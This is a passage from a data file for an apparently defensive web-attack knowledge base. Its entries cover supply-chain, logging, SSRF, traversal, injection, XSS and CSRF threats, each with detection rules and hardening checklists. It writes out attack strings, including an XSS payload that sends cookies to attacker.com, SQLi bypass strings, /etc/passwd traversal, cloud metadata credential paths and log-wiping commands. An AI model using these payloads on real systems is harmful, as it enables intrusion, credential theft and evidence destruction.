detection:
    selection:
        process_name:
            - 'npm'
            - 'pip'
            - 'mvn'
            - 'gradle'
        dest_ip|startswith:
            - '185.'
            - '194.'
            - '45.'
    condition: selection
level: high
tags:
    - attack.initial_access
    - attack.t1195`,
      splunk: `index=cicd_audit action="package_install" (signature_verified=false OR checksum_mismatch=true)
| eval Alert="CRITICAL: Unsigned or Hash Mismatched Third-Party Software Dependency Installed in Build"
| table _time, repo, build_id, package_name, checksum_mismatch, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
    msg:"SEC-ALERT Insecure HTTP Auto-Update Download Lacking TLS/Integrity";
    flow:to_server,established;
    content:"GET"; http_method;
    content:".exe"; http_uri;
    classtype:policy-violation;
    sid:1000091;
    rev:1;
)`,
      sysmon: `# Verify cryptographic container image signatures via cosign:
cosign verify --key cosign.pub myregistry.internal/app:production`
    },
    defenseChecklist: [
      { id: "integ_1", title: "Enforce Cryptographic Artifact Signing (Cosign / Sigstore)", tier: "Supply Chain", desc: "Sign all build artifacts, container images, and software binaries with Sigstore/Cosign and verify signatures before deployment." },
      { id: "integ_2", title: "Enforce Subresource Integrity (SRI) on Web Assets", tier: "Frontend Security", desc: "Include integrity='sha384-...' attributes on all CDN-hosted script tags to prevent third-party CDN compromises from injecting card skimmers." },
      { id: "integ_3", title: "Ban Insecure Deserialization of Untrusted Data", tier: "Secure Coding", desc: "Never use Java native serialization, Python pickle, or PHP unserialize on client input; use strict JSON schemas or Protobuf instead." },
      { id: "integ_4", title: "Isolate CI/CD Build Runners with Strict Egress Controls", tier: "DevOps Security", desc: "Run CI/CD pipelines in ephemeral sandboxes with restricted outbound egress limited to verified internal artifact mirrors." }
    ]
  },
  {
    num: 92,
    id: "logging-failures",
    name: "Security Logging and Monitoring Failures",
    shortName: "Logging Failures",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "high",
    cvss: "7.7",
    mitre: "T1562.002, T1070, T1562.001",
    primaryTargets: "SIEM Systems, Centralized Syslog, SOC Alerting Queues, Audit Trails, Forensic Stores",
    threatActors: "Covert APTs, Ransomware Dwellers, Rogue System Administrators",
    summary: "Without logging and monitoring, breaches cannot be detected. Insufficient logging, detection, monitoring, and active response occurs when auditable events (logins, failed authentication, high-value transactions) are not logged, warnings and errors generate no logs, logs are stored locally where attackers can alter or delete them, alerting thresholds are nonexistent, and active real-time monitoring is absent. Average breach dwell time without proper logging exceeds 200 days.",
    killChain: [
      {
        step: 1,
        title: "Logging Blindspot Identification",
        mitre: "T1592",
        desc: "Probing endpoints with invalid inputs and observing whether security telemetry triggers alerts, rate limits, or administrative warnings."
      },
      {
        step: 2,
        title: "Log Tampering & Agent Disablement",
        mitre: "T1562.001",
        desc: "Killing local syslog daemons, disabling Windows Event Log services, or flooding log buffers to trigger log rolling and hide intrusion tracks."
      },
      {
        step: 3,
        title: "Undetected Long-Term Lateral Persistence",
        mitre: "T1070",
        desc: "Dwelling inside the enterprise for months, systematically exfiltrating proprietary records without triggering SOC incident alerts."
      }
    ],
    telemetry: {
      sources: [
        "Centralized SIEM Log Ingestion Monitors (Splunk Ingestion Health, Elastic Fleet)",
        "Audit Log Integrity Monitors (File Integrity Monitoring on /var/log)",
        "Heartbeat Telemetry from Security Agents"
      ],
      anomalies: [
        "Abrupt cessation of log forwarding from high-value production servers",
        "Gaps in sequence numbering of transaction audit logs",
        "Attempts to execute wevtutil cl (clear event logs) or rm -rf /var/log"
      ]
    },
    rules: {
      sigma: `title: Windows Event Log Cleared via Wevtutil
id: d9e0f1a2-b3c4-5d6e-7f8a-9b0c1d2e3f4a
status: production
description: Detects execution of wevtutil.exe used by adversaries to wipe Windows Security and System event logs.
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\wevtutil.exe'
        CommandLine|contains:
            - ' cl '
            - 'clear-log'
    condition: selection
level: critical
tags:
    - attack.defense_evasion
    - attack.t1070.001`,
      splunk: `index=security (sourcetype="WinEventLog:Security" EventCode=1102) OR (sourcetype="linux_audit" type="ANOM_PROMISC")
| eval Alert="CRITICAL DEFENSE EVASION: Audit Log Cleared or Promiscuous Mode Activated"
| table _time, host, user, Alert`,
      suricata: `alert tcp $HOME_NET any -> $EXTERNAL_NET 514 (
    msg:"SEC-ALERT Cleartext Syslog Egress Outside Organization Perimeter";
    flow:to_server,established;
    content:"syslog"; nocase;
    classtype:policy-violation;
    sid:1000092;
    rev:1;
)`,
      sysmon: `# Monitor Sysmon Event ID 1 for log clearing commands:
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=1} | Where-Object {$_.Message -match "wevtutil"}`
    },
    defenseChecklist: [
      { id: "log_1", title: "Centralized Immutable Write-Once (WORM) Logging", tier: "SIEM Architecture", desc: "Forward all logs in real time over TLS to an immutable centralized SIEM (Splunk, Elastic, CloudWatch) with WORM storage policies." },
      { id: "log_2", title: "Comprehensive Security Event Auditing", tier: "Application Logging", desc: "Log all authentication attempts, privilege changes, access control failures, and sensitive financial transactions with full context." },
      { id: "log_3", title: "Real-Time 24/7 Threat Alerting & Automated SOAR", tier: "SOC Operations", desc: "Configure high-fidelity alerting rules with automated SOAR playbooks to respond to brute-force, injection, and privilege escalation immediately." },
      { id: "log_4", title: "SIEM Agent Heartbeat & Tamper Monitoring", tier: "Endpoint Security", desc: "Deploy watchdog services that trigger high-severity alerts immediately if any server stops sending log telemetry for >5 minutes." }
    ]
  },
  {
    num: 93,
    id: "ssrf-attack",
    name: "Server-Side Request Forgery (SSRF)",
    shortName: "SSRF Attack",
    moduleGroup: "owasp",
    module: "OWASP Top 10 Web Application Attacks",
    category: "owasp",
    severity: "critical",
    cvss: "9.3",
    mitre: "T1190, T1552.005",
    primaryTargets: "Cloud Instance Metadata Services (169.254.169.254), Internal Microservices, Backend Databases",
    threatActors: "Cloud Penetration Specialists, Capital One Breachers, Data Ransomware Gangs",
    summary: "SSRF flaws occur whenever a web application fetches a remote resource without validating the user-supplied URL. An adversary can coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or network ACL. In cloud environments (AWS, Azure, GCP), attackers query the Instance Metadata Service (IMDS) at 169.254.169.254 to steal IAM temporary credentials and assume cloud administrator roles.",
    killChain: [
      {
        step: 1,
        title: "URL Parameter Discovery & SSRF Probing",
        mitre: "T1595.002",
        desc: "Identifying input parameters that load remote URLs (e.g. url=, webhook=, image_url=, import=) using Burp Collaborator or interactsh."
      },
      {
        step: 2,
        title: "Internal Infrastructure & Metadata Scanning",
        mitre: "T1190",
        desc: "Submitting loopback (127.0.0.1) and link-local cloud metadata addresses (http://169.254.169.254/latest/meta-data/) to bypass perimeter firewalls."
      },
      {
        step: 3,
        title: "IAM Role Exfiltration & Cloud Takeover",
        mitre: "T1552.005",
        desc: "Harvesting AWS STS AccessKeyId, SecretAccessKey, and Token from IMDS to pivot into cloud control planes and siphoning S3 buckets."
      }
    ],
    telemetry: {
      sources: [
        "Web Server Access & Outbound Proxy Logs",
        "Cloud VPC Flow Logs (Outbound traffic from web tier to 169.254.169.254)",
        "AWS CloudTrail / Azure Activity Logs (Unusual STS AssumeRole and IAM actions)"
      ],
      anomalies: [
        "Outbound HTTP GET requests directed at 169.254.169.254 or RFC 1918 internal subnets (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)",
        "Spike in IAM API calls originating from external IP addresses using EC2 instance profile temporary credentials",
        "Use of alternate IP encodings (e.g. http://2130706433, http://0x7f.0.0.1, http://[::1]) in URL parameters"
      ]
    },
    rules: {
      sigma: `title: Server-Side Request Forgery Targeting Cloud Metadata Service
id: e0f1a2b3-c4d5-6e7f-8a9b-0c1d2e3f4a5b
status: production
description: Detects outbound HTTP requests from web servers to the link-local cloud metadata IP (169.254.169.254).
logsource:
    category: webserver
detection:
    selection:
        cs-uri-query|contains:
            - '169.254.169.254'
            - 'metadata.google.internal'
            - '169.254.169.254/latest/meta-data'
    condition: selection
level: critical
tags:
    - attack.initial_access
    - attack.t1190`,
      splunk: `index=vpc_flow (dest_ip="169.254.169.254" OR dest_ip="127.0.0.1") src_ip IN ("10.0.*", "172.16.*")
| stats count by src_ip, dest_ip, dest_port
| eval Alert="CRITICAL: Internal Host Querying Cloud Metadata Service (SSRF Indicator)"
| table _time, src_ip, dest_ip, dest_port, count, Alert`,
      suricata: `alert tcp $HOME_NET any -> 169.254.169.254 $HTTP_PORTS (
    msg:"SEC-ALERT Outbound Cloud Metadata (IMDS) Retrieval Attempt (Possible SSRF)";
    flow:to_server,established;
    content:"/latest/meta-data/"; http_uri;
    classtype:policy-violation;
    sid:1000093;
    rev:1;
)`,
      sysmon: `# Enforce IMDSv2 requirement on AWS EC2 instance:
aws ec2 modify-instance-metadata-options --instance-id i-1234567890abcdef0 --http-tokens required --http-endpoint enabled`
    },
    defenseChecklist: [
      { id: "ssrf_1", title: "Mandate IMDSv2 with Session Token Headers", tier: "Cloud Architecture", desc: "Require IMDSv2 (PUT request with X-aws-ec2-metadata-token) across all cloud instances and set hop limit to 1 to block SSRF proxying." },
      { id: "ssrf_2", title: "Strict URL Scheme & Domain Whitelisting", tier: "Application Logic", desc: "Never permit arbitrary URLs. Validate protocols strictly to HTTPS and whitelist exact allowed target domain names." },
      { id: "ssrf_3", title: "Block Loopback and RFC 1918 Private Addresses", tier: "Network / AppSec", desc: "Resolve destination DNS and drop any connection resolving to 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, or 169.254.169.254." },
      { id: "ssrf_4", title: "Isolated Egress Proxy for Webhook Delivery", tier: "Network Segmentation", desc: "Route any required external resource fetching through a dedicated, isolated egress proxy that enforces strict firewall egress rules." }
    ]
  },

  // =========================================================================
  // MODULE 17: OTHER WEB APPLICATION ATTACKS (94 - 100)
  // =========================================================================
  {
    num: 94,
    id: "web-directory-traversal",
    name: "Directory Traversal (Repeated)",
    shortName: "Directory Traversal",
    moduleGroup: "other-web",
    module: "Other Web Application Attacks",
    category: "other-web",
    severity: "high",
    cvss: "8.6",
    mitre: "T1083, T1005",
    primaryTargets: "Web Server File Systems, Document Download Endpoints, Static File Handlers, /etc/passwd, win.ini",
    threatActors: "Web Crawlers, Bug Bounty Hunters, Black Hat Hackers",
    summary: "Directory Traversal (also known as Path Traversal) allows attackers to read arbitrary files on the server that runs an application. By manipulating variables that reference files with dot-dot-slash ('../') sequences and variations (URL-encoded '%2e%2e%2f', double-encoded '%252e%252e%252f', or null-byte '%00'), adversaries break out of the document root directory and access application source code, configuration files containing credentials, and operating system sensitive files like /etc/shadow or C:\\Windows\\win.ini.",
    killChain: [
      {
        step: 1,
        title: "File Parameter Identification",
        mitre: "T1595.002",
        desc: "Locating input parameters that retrieve files from disk (e.g. ?file=, ?download=, ?path=, ?template=)."
      },
      {
        step: 2,
        title: "Path Traversal Sequence Injection",
        mitre: "T1083",
        desc: "Injecting relative path traversal sequences (../../../../etc/passwd or ..\\..\\..\\windows\\win.ini) to escape web root directories."
      },
      {
        step: 3,
        title: "Sensitive Credential & Source Extraction",
        mitre: "T1005",
        desc: "Extracting database configuration files (config.php, appsettings.json), SSH private keys, and OS user lists."
      }
    ],
    telemetry: {
      sources: [
        "Web Server Access Logs (Apache, Nginx, IIS access logs with /.. sequences)",
        "Host File Access Audits (Sysmon Event ID 11, Linux auditd open syscalls on /etc/passwd)",
        "WAF Event Logs"
      ],
      anomalies: [
        "HTTP requests containing '%2e%2e%2f', '..%2f', or '..%5c' patterns in URI or query strings",
        "Web server processes opening files outside the designated docroot directory",
        "Sudden surge in HTTP 200 responses to file download endpoints returning system file signatures"
      ]
    },
    rules: {
      sigma: `title: Directory Traversal Path Manipulation in Web Request
id: f1a2b3c4-d5e6-7f8a-9b0c-1d2e3f4a5b6c
status: production
description: Detects directory traversal escape sequences (../, ..\\, and encodings) in web request URIs.
logsource:
    category: webserver
detection:
    selection:
        cs-uri|contains:
            - '/../'
            - '\\..\\'
            - '%2e%2e%2f'
            - '%2e%2e%5c'
            - '..%2f'
            - '/etc/passwd'
            - 'windows/win.ini'
    condition: selection
level: high
tags:
    - attack.discovery
    - attack.t1083`,
      splunk: `index=web_logs (uri="*../*" OR uri="*..\\\\*" OR uri="*%2e%2e%2f*" OR uri="*/etc/passwd*")
| stats count by c_ip, uri, status
| eval Alert="HIGH: Path Traversal / Arbitrary File Read Exploit Attempt"
| table _time, c_ip, uri, status, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Path Traversal Sequence in HTTP URI";
    flow:to_server,established;
    content:"../"; http_uri;
    classtype:web-application-attack;
    sid:1000094;
    rev:1;
)`,
      sysmon: `# Verify file resolution code uses canonical path verification
grep -rn "path.join" ./src/ | grep -v "path.resolve"`
    },
    defenseChecklist: [
      { id: "dt_1", title: "Use Canonical Path Verification (Path.resolve)", tier: "Application Logic", desc: "Resolve the canonical target path and strictly verify that it starts with the designated root directory before opening any file." },
      { id: "dt_2", title: "Maintain Strict File Whitelist / ID Mapping", tier: "Application Logic", desc: "Map user requests to an indirect integer or UUID key mapped in an internal database rather than accepting file system paths." },
      { id: "dt_3", title: "Restrict File System Permissions (Chroot / Jail)", tier: "OS Hardening", desc: "Run the web server process in a chrooted jail or unprivileged container with read-only access to necessary files." },
      { id: "dt_4", title: "Deploy WAF Path Traversal Inspection Rules", tier: "Perimeter", desc: "Activate WAF rules to reject HTTP requests containing decoded or raw dot-dot-slash patterns." }
    ]
  },
  {
    num: 95,
    id: "input-filtering-attack",
    name: "Input Filtering Attack",
    shortName: "Input Filtering Attack",
    moduleGroup: "other-web",
    module: "Other Web Application Attacks",
    category: "other-web",
    severity: "high",
    cvss: "8.2",
    mitre: "T1190, T1027",
    primaryTargets: "WAF Input Filters, Form Sanitization Functions, Regular Expression Matchers, Input Gateways",
    threatActors: "Advanced Exploit Developers, Red Teams, Penetration Testers",
    summary: "Input Filtering Attacks target the sanitization and filtering mechanisms implemented by applications and Web Application Firewalls (WAF). Attackers employ sophisticated evasion techniques—including nested character encoding (e.g. nested script tags like '<scr<script>ipt>'), alternate character sets (UTF-7, UTF-16), case-toggling, whitespace obfuscation, SQL comment interleaving ('UNI/**/ON'), and ReDoS (Regular Expression Denial of Service)—to bypass blocklists and slip malicious payloads past inspection engines.",
    killChain: [
      {
        step: 1,
        title: "Filter Rule Character Profiling",
        mitre: "T1595.002",
        desc: "Testing a series of probe characters (<, >, ', \", %, &, null-byte) to determine which characters are blocked, stripped, or encoded."
      },
      {
        step: 2,
        title: "Encoding & Obfuscation Mutation",
        mitre: "T1027",
        desc: "Constructing mutant payloads using multi-byte Unicode, hex encoding, chunked HTTP transfer, or comment fragmentation."
      },
      {
        step: 3,
        title: "Inspection Engine Bypass & Payload Execution",
        mitre: "T1190",
        desc: "The sanitized string passes the flawed filter, is decoded downstream by the application interpreter, and triggers the intended attack."
      }
    ],
    telemetry: {
      sources: [
        "Web Application Firewall (WAF) Anomaly Logs (ModSecurity, Cloudflare, AWS WAF)",
        "Application Input Sanitization Logs (Warning events from validator libraries)",
        "Web Server CPU Spikes (Indicative of ReDoS regex catastrophic backtracking)"
      ],
      anomalies: [
        "Payloads containing nested tags, excessive null-bytes, or mismatched character encodings",
        "Sudden spike in CPU utilization to 100% on web application worker processes processing specific input fields (ReDoS)",
        "High frequency of WAF evasion heuristic triggers from single IP subnets"
      ]
    },
    rules: {
      sigma: `title: WAF Input Filter Evasion Technique via Comment Obfuscation
id: a2b3c4d5-e6f7-8a9b-0c1d-2e3f4a5b6c7d
status: production
description: Detects SQL comment splitting (/**/) and nested script tag evasion patterns designed to defeat naive input filters.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-query|contains:
            - '/**/'
            - '<scr<script>ipt>'
            - '%00'
            - '/*!'
    condition: selection
level: high
tags:
    - attack.defense_evasion
    - attack.t1027`,
      splunk: `index=waf_logs (cs_uri_query="*/**/union*" OR cs_uri_query="*<scr*ipt*" OR cs_uri_query="*%00*")
| stats count by c_ip, cs_uri_query, action
| eval Alert="HIGH: Input Filtering & WAF Evasion Technique Detected"
| table _time, c_ip, cs_uri_query, action, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Input Filter Evasion - SQL Comment Splitting in URI";
    flow:to_server,established;
    content:"/**/"; http_uri;
    classtype:web-application-attack;
    sid:1000095;
    rev:1;
)`,
      sysmon: `# Audit regular expressions for catastrophic backtracking vulnerabilities:
npx safe-regex ./src/validators/*.js`
    },
    defenseChecklist: [
      { id: "ifa_1", title: "Adopt Strict Positive Allowlist Validation", tier: "Application Logic", desc: "Validate input against strict positive allowlists (data type, length, regex pattern) rather than relying on flawed negative blocklists." },
      { id: "ifa_2", title: "Context-Aware Contextual Output Encoding", tier: "Application Logic", desc: "Encode data immediately before it is rendered into specific contexts (HTML body, JavaScript variable, URL, CSS) using OWASP Java Encoder." },
      { id: "ifa_3", title: "Audit Regular Expressions Against ReDoS", tier: "AppSec", desc: "Verify that regular expressions do not contain nested quantifiers or catastrophic backtracking flaws that can be exploited for DoS." },
      { id: "ifa_4", title: "Multi-Pass Unicode Normalization", tier: "Input Processing", desc: "Normalize all incoming text to standard Unicode (NFC/NFKC) before validation to prevent homoglyph and multi-byte bypasses." }
    ]
  },
  {
    num: 96,
    id: "web-code-injection",
    name: "Code Injection (Repeated)",
    shortName: "Web Code Injection",
    moduleGroup: "other-web",
    module: "Other Web Application Attacks",
    category: "other-web",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1059.004, T1059.006",
    primaryTargets: "Web Application Runtimes (Node.js, PHP, Python eval(), Ruby send), Server Frameworks",
    threatActors: "Web Shell Operators, Ransomware Initial Access Brokers, State-Sponsored Espionage",
    summary: "Code Injection differs from Command Injection: in Code Injection, the attacker introduces or injects code into a vulnerable computer program and gets the application runtime environment itself to execute it (e.g. PHP eval(), Python exec(), Node.js vm.runInContext()). This enables adversaries to bypass operating system process creation logging while obtaining full arbitrary execution within the memory space and permissions of the web service process.",
    killChain: [
      {
        step: 1,
        title: "Dynamic Evaluation Sinks Discovery",
        mitre: "T1595.002",
        desc: "Identifying input parameters reflected into dynamic language evaluation functions (eval, assert, preg_replace /e, deserialize)."
      },
      {
        step: 2,
        title: "Runtime Syntax Smuggling",
        mitre: "T1059.004",
        desc: "Injecting syntax terminators and language-specific code snippets (e.g. ;phpinfo();, require('child_process'), import os; os.system)."
      },
      {
        step: 3,
        title: "In-Memory Web Shell Execution",
        mitre: "T1059.006",
        desc: "Executing arbitrary web shell instructions in memory without writing files to disk, stealing database sessions and tokens."
      }
    ],
    telemetry: {
      sources: [
        "Web Application Runtime Exception Logs (ParseError, SyntaxError in eval)",
        "Application Performance Monitoring (APM / OpenTelemetry profiling calls to eval)",
        "WAF Payload Inspection Logs"
      ],
      anomalies: [
        "HTTP POST requests containing runtime code keywords ('eval(', 'base64_decode', 'require(', 'exec(')",
        "Execution of dynamic code loading functions flagged by static analysis or APM profilers",
        "Sudden outbound network connections established directly from Node.js, Python, or PHP processes"
      ]
    },
    rules: {
      sigma: `title: Suspicious Dynamic Code Injection Keywords in HTTP Request
id: b3c4d5e6-f7a8-9b0c-1d2e-3f4a5b6c7d8e
status: production
description: Detects code execution functions (eval, system, exec, passthru) submitted within HTTP body payloads.
logsource:
    category: webserver
detection:
    selection:
        payload|contains:
            - 'eval('
            - 'passthru('
            - 'base64_decode('
            - 'child_process'
            - '__import__'
    condition: selection
level: critical
tags:
    - attack.execution
    - attack.t1059`,
      splunk: `index=web_waf (payload="*eval(*" OR payload="*base64_decode(*" OR payload="*require('child_process')*")
| stats count by src_ip, dest_ip, uri, payload
| eval Alert="CRITICAL: Server-Side Language Code Injection Exploit Attempt"
| table _time, src_ip, dest_ip, uri, payload, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Server-Side Dynamic Code Execution Expression in POST Body";
    flow:to_server,established;
    content:"eval("; http_client_body; nocase;
    classtype:web-application-attack;
    sid:1000096;
    rev:1;
)`,
      sysmon: `# Scan source tree for dangerous eval or dynamic execution calls:
semgrep --config "p/security-audit" --pattern '$X.eval(...)' ./src/`
    },
    defenseChecklist: [
      { id: "wci_1", title: "Ban Dynamic Code Evaluation Functions (eval / exec)", tier: "Secure Coding", desc: "Prohibit all calls to eval(), new Function(), exec(), and vm.runInContext() in code style guides and enforce with strict ESLint / SonarQube rules." },
      { id: "wci_2", title: "Enforce Read-Only Container Root Filesystem", tier: "Container Hardening", desc: "Run containers with --read-only root filesystems and tmpfs for temporary folders to prevent dropping persistent file-based web shells." },
      { id: "wci_3", title: "Disable Insecure PHP / Runtime Functions", tier: "Runtime Config", desc: "Configure php.ini with 'disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source'." },
      { id: "wci_4", title: "Deploy Runtime Application Self-Protection (RASP)", tier: "AppSec", desc: "Deploy RASP agents to monitor language runtime hooks and automatically terminate threads attempting to invoke unauthorized eval calls." }
    ]
  },
  {
    num: 97,
    id: "web-sql-injection",
    name: "SQL Injection (Repeated)",
    shortName: "Web SQL Injection",
    moduleGroup: "other-web",
    module: "Other Web Application Attacks",
    category: "other-web",
    severity: "critical",
    cvss: "9.8",
    mitre: "T1190, CWE-89",
    primaryTargets: "Web Form Handlers, URL Parameters, REST API Query Filters, JSON Request Bodies",
    threatActors: "Sqlmap Automated Operators, Data Brokers, Underground Breach Forums",
    summary: "Web-layer SQL Injection exploits untrusted user input concatenated directly into database queries within web application presentation and business logic layers. Attackers submit UNION-based queries, error-based payloads, and boolean logic to subvert intended application queries, bypass user authentication screens with 'admin' OR '1'='1'--, and extract millions of customer PII and password records directly through web response streams.",
    killChain: [
      {
        step: 1,
        title: "Tautology & Delimiter Injection",
        mitre: "T1190",
        desc: "Injecting quotes and boolean tautologies (' OR '1'='1) into search boxes and login forms to bypass authentication."
      },
      {
        step: 2,
        title: "UNION SELECT Column Discovery",
        mitre: "T1083",
        desc: "Probing column counts with ORDER BY 1,2,3... and issuing UNION SELECT null, null... to align data types for extraction."
      },
      {
        step: 3,
        title: "Full Database Siphoning",
        mitre: "T1005",
        desc: "Extracting password hashes, sensitive customer records, and credit card tokens directly in web response tables."
      }
    ],
    telemetry: {
      sources: [
        "Web Server Access Logs (Apache, Nginx, IIS access logs with SQL keywords)",
        "WAF Event Logs (ModSecurity, Cloudflare, AWS WAF SQLi rule matches)",
        "Database Audit Logs (Unusual query execution profiles)"
      ],
      anomalies: [
        "HTTP requests containing SQL syntax tokens ('UNION SELECT', 'OR 1=1', 'BENCHMARK(', 'WAITFOR DELAY')",
        "Rapid burst of HTTP 500 error responses followed by large HTTP 200 payload responses",
        "Web application submitting queries that access system metadata tables (information_schema.tables)"
      ]
    },
    rules: {
      sigma: `title: Classic Web SQL Injection Attack Patterns
id: c4d5e6f7-a8b9-0c1d-2e3f-4a5b6c7d8e9f
status: production
description: Detects classic SQL injection UNION and authentication bypass patterns in web request parameters.
logsource:
    category: webserver
detection:
    selection:
        cs-uri-query|contains:
            - 'UNION SELECT'
            - 'UNION+SELECT'
            - '\' OR \''
            - '\' OR 1=1'
            - '--'
    condition: selection
level: critical
tags:
    - attack.initial_access
    - attack.t1190`,
      splunk: `index=web_waf (cs_uri_query="*UNION*SELECT*" OR cs_uri_query="*OR*1=1*")
| stats count by c_ip, cs_uri_stem, cs_uri_query
| eval Alert="CRITICAL: Web SQL Injection Exploitation Detected"
| table _time, c_ip, cs_uri_stem, cs_uri_query, count, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Web SQL Injection UNION SELECT Statement Detected";
    flow:to_server,established;
    content:"UNION"; nocase; http_uri;
    content:"SELECT"; nocase; http_uri;
    classtype:web-application-attack;
    sid:1000097;
    rev:1;
)`,
      sysmon: `# Verify parameterized queries in backend code:
grep -rn "SELECT" ./src/ | grep -E "\\+|\\$"`
    },
    defenseChecklist: [
      { id: "wsq_1", title: "Mandatory Parameterized Prepared Statements", tier: "Application Logic", desc: "Enforce parameterized prepared statements for 100% of SQL queries across all web controllers and repository modules." },
      { id: "wsq_2", title: "Principle of Least Privilege Database Account", tier: "Database Hardening", desc: "Configure web applications to connect with accounts limited strictly to necessary SELECT, INSERT, UPDATE permissions; revoke DROP and ALTER." },
      { id: "wsq_3", title: "Deploy Web Application Firewall (WAF) SQLi Shield", tier: "Perimeter", desc: "Enable aggressive SQLi inspection signatures on edge WAFs to terminate anomalous SQL tokens before reaching web servers." },
      { id: "wsq_4", title: "Automated SAST & DAST SQL Injection Scanning", tier: "CI/CD Pipeline", desc: "Run continuous static code analysis and automated dynamic vulnerability scanners on every staging deployment." }
    ]
  },
  {
    num: 98,
    id: "web-xss",
    name: "Cross-Site Scripting (XSS) (Repeated)",
    shortName: "Web XSS (Repeated)",
    moduleGroup: "other-web",
    module: "Other Web Application Attacks",
    category: "other-web",
    severity: "high",
    cvss: "8.3",
    mitre: "T1189, T1059.007",
    primaryTargets: "Client Browsers, Session Storage, DOM Objects, User Cookies, Single Page Applications (SPA)",
    threatActors: "Magecart Card Skimmers, Session Hijackers, Social Engineering Phishers",
    summary: "Cross-Site Scripting (XSS) attacks occur when malicious scripts are injected into otherwise benign and trusted websites. When a victim's browser renders the webpage containing injected JavaScript, the browser executes the script in the context of the user's session. Variants include Stored (Persistent) XSS, Reflected XSS, and DOM-based XSS, enabling session cookie theft, keylogging of banking credentials, and dynamic page defacement.",
    killChain: [
      {
        step: 1,
        title: "Injection Sink Identification",
        mitre: "T1595.002",
        desc: "Probing input forms (comments, profile names, search boxes) to see if raw HTML/JS characters (<script>, <img>, onerror) are reflected into the DOM."
      },
      {
        step: 2,
        title: "Malicious Script Payload Delivery",
        mitre: "T1189",
        desc: "Injecting obfuscated JavaScript payloads (e.g. <img src=x onerror=this.src='https://attacker.com/log?c='+document.cookie>)."
      },
      {
        step: 3,
        title: "Client-Side Execution & Credential Theft",
        mitre: "T1059.007",
        desc: "Victim loads the page; script executes, exfiltrating session tokens, keystrokes, and submitted form passwords to attacker C2."
      }
    ],
    telemetry: {
      sources: [
        "Web Application Firewall (WAF) Inspection Logs",
        "Content Security Policy (CSP) Violation Reports",
        "Client-Side Telemetry & Browser Error Reporting"
      ],
      anomalies: [
        "Inbound requests containing '<script', 'javascript:', 'onerror=', or 'onload=' tags",
        "Surge in Content Security Policy violation reports submitted by user browsers",
        "Outbound browser network requests directed to unknown third-party domains carrying cookie parameters"
      ]
    },
    rules: {
      sigma: `title: Cross-Site Scripting (XSS) Inbound Script Tag Injection
id: d5e6f7a8-b9c0-1d2e-3f4a-5b6c7d8e9f0a
status: production
description: Detects basic script tags and event handler injection strings in HTTP request query and body.
logsource:
    category: webserver
detection:
    selection:
        payload|contains:
            - '<script'
            - 'javascript:'
            - 'onerror='
            - 'onload='
            - '<svg onload'
    condition: selection
level: high
tags:
    - attack.initial_access
    - attack.t1189`,
      splunk: `index=web_waf (payload="*<script*" OR payload="*javascript:*" OR payload="*onerror=*")
| stats count by src_ip, uri, payload
| eval Alert="HIGH: Cross-Site Scripting (XSS) Exploit Attempt"
| table _time, src_ip, uri, payload, Alert`,
      suricata: `alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"SEC-ALERT Cross-Site Scripting XSS Script Tag Detected";
    flow:to_server,established;
    content:"<script"; nocase; http_uri;
    classtype:web-application-attack;
    sid:1000098;
    rev:1;
)`,
      sysmon: `# Verify CSP header implementation:
curl -I https://target-app.internal | grep -i "content-security-policy"`
    },
    defenseChecklist: [
      { id: "wxss_1", title: "Enforce Strict Content Security Policy (CSP Level 3)", tier: "HTTP Headers", desc: "Deploy 'Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...' object-src 'none';' to completely block inline and unauthorized scripts." },
      { id: "wxss_2", title: "Context-Aware Output Encoding (DOMPurify)", tier: "Application Logic", desc: "Sanitize all user-controlled HTML using DOMPurify before inserting into DOM, and encode data contextually." },
      { id: "wxss_3", title: "HttpOnly & SameSite Session Cookies", tier: "Cookie Security", desc: "Set HttpOnly flag on all authentication and session cookies so client-side JavaScript cannot access or steal them via document.cookie." },
      { id: "wxss_4", title: "Use Safe Modern Frontend Frameworks", tier: "Development", desc: "Use frameworks like React or Angular that automatically escape data binding by default, avoiding dangerouslySetInnerHTML." }
    ]
  },
  {
    num: 99,
    id: "csrf",
    name: "Cross-Site Request Forgery (CSRF)",
    shortName: "CSRF Attack",
    moduleGroup: "other-web",
    module: "Other Web Application Attacks",
    category: "other-web",
    severity: "high",
    cvss: "8.1",
    mitre: "T1189, T1566.002",
    primaryTargets: "Authenticated User Sessions, Password Change Endpoints, Wire Transfer APIs, Router Admin Consoles",
    threatActors: "Financial Fraudsters, Phishing Syndicates, Compromised Ad Networks",
    summary: "CSRF forces an end user to execute unwanted actions on a web application in which they are currently authenticated. Because browsers automatically include ambient session cookies with cross-origin requests, a malicious website visited by an authenticated user can submit hidden POST requests to vulnerable banking or administrative portals (e.g., transferring funds, changing user email/password) without the victim's knowledge or consent.",
    killChain: [
      {
        step: 1,
        title: "Vulnerable State-Changing Endpoint Discovery",
        mitre: "T1595.002",
        desc: "Locating critical POST/PUT endpoints (e.g. /account/change-email) that lack anti-CSRF token validation."
      },
      {
        step: 2,
        title: "Malicious Trap Site Weaponization",
        mitre: "T1189",
        desc: "Crafting a malicious HTML page with an auto-submitting hidden form pointing to the target application's endpoint."
      },
      {
        step: 3,
